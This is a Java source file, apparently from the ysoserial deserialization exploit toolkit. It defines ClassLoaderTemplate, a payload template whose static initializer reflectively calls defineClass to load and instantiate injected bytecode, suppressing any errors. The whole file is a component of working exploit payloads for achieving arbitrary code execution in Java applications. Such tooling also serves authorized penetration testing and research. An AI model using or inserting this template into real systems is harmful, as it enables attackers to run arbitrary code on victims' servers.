package ysoserial.payloads.templates;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class ClassLoaderTemplate {
    static byte[] bs;

    static {
        try {
            ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class invoke = (Class) defineClass.invoke(classLoader, bs, 0, bs.length);
            invoke.newInstance();
        } catch (Exception e) {
            // e.printStackTrace();
        }
    }
}
